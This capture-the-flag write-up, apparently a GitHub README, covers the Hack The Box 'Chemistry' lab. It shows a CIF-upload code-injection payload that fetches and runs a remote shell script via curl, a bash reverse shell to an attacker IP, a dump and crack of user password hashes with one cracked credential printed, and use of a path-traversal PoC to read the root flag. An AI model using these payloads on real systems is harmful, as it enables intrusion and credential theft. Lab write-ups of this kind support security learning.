# -HTB-Chemistry


### I start with nmap scan

```
nmap -p- -sVC 10.10.11.38 -oN nmap_scan --min-rate 5000 -vv
```

<img width="1392" height="472" alt="image" src="https://github.com/user-attachments/assets/26c7ac9b-4191-4792-bca9-76f0361fd7e7" />


### I make an account on the site and we can see he want us to upload a .cif file 


<img width="1500" height="595" alt="image" src="https://github.com/user-attachments/assets/0a6ad506-a2f1-4b07-95d5-ecf89a4951a6" />


### If we search on google we can see an exploit for cif upload file 

<img width="1284" height="475" alt="image" src="https://github.com/user-attachments/assets/6a59005d-43fc-48a3-abb2-ab239c6ecce6" />


<img width="999" height="427" alt="image" src="https://github.com/user-attachments/assets/f99b98ee-d62c-4f4b-a350-e188c7c92b9a" />

```
https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
```

### I modify the file so the payload to curl on our server and download a shell file with :
### shell
```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.25/1337 0>&1"
```
----

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://10.10.14.25/shell.sh|sh");0,0,0'
```


### And we uplade the cif file and press view 



<img width="1373" height="563" alt="image" src="https://github.com/user-attachments/assets/70caa5b7-1840-4304-acb6-f2d78b6d03dd" />


### And we get shell as "app"

<img width="655" height="169" alt="image" src="https://github.com/user-attachments/assets/edb010ec-ac1f-4e3f-ba09-cfa31c28b169" />

### On instance we have a db "database.db" who we can use sqlite3 to see what it s inside 

```
cd instance
sqlite3 database.db
.tables
select * from user;
```

<img width="448" height="325" alt="image" src="https://github.com/user-attachments/assets/693a84a7-74bc-4ee4-9b1f-78387b9e816b" />


### We take all the hashes and put them on crackstation

<img width="492" height="594" alt="image" src="https://github.com/user-attachments/assets/752118db-0311-4a7f-a288-eda6aad78174" />


<img width="1215" height="834" alt="image" src="https://github.com/user-attachments/assets/d7b85d12-edb9-4fc0-862f-85836abde005" />

### And we have the rosa with their password

```
rosa:unicorniosrosados
```

### On rosa account we can find the user flag 

<img width="1014" height="714" alt="image" src="https://github.com/user-attachments/assets/455d3a9b-5219-4b45-9afa-68615e1a42b4" />

# Root

### We can see on localhost the 8080 it s open

```
ss -tulpn
```
<img width="1338" height="168" alt="image" src="https://github.com/user-attachments/assets/385a19a9-b947-4fcf-a8be-45e012e07a85" />


### So let s forward the port to us 

```
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

<img width="1369" height="600" alt="image" src="https://github.com/user-attachments/assets/f24152dd-42b3-42ce-8d10-900cbd4f2301" />

### The site it s almost empty so i try to nmap the port 

```
nmap -p 8888 -sV -sC 127.0.0.1
```

<img width="637" height="210" alt="image" src="https://github.com/user-attachments/assets/1958822b-c6ea-4c1b-a387-4e37555ff3fe" />

### If we search this version on goole we find a CVE "CVE-2024-23334-PoC"

```
https://github.com/z3rObyte/CVE-2024-23334-PoC
```

### To modify the script we need to know where the root flag it is to be able to cut it , so i use feroxbuster on the localhost 


```
feroxbuster -u http://127.0.0.1:8888/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

<img width="1188" height="179" alt="image" src="https://github.com/user-attachments/assets/2d535b8d-27d4-45b4-9953-bc78aa2689e6" />

### And we find a folder asset which handles the static resources . So i modifiy the script :


<img width="793" height="309" alt="image" src="https://github.com/user-attachments/assets/9ac3c099-9034-474f-9c39-b2bff08ab999" />

### And if we run the script we find the root flag 


<img width="591" height="208" alt="image" src="https://github.com/user-attachments/assets/736715bd-616b-4b83-8a05-c750b4f1456b" />


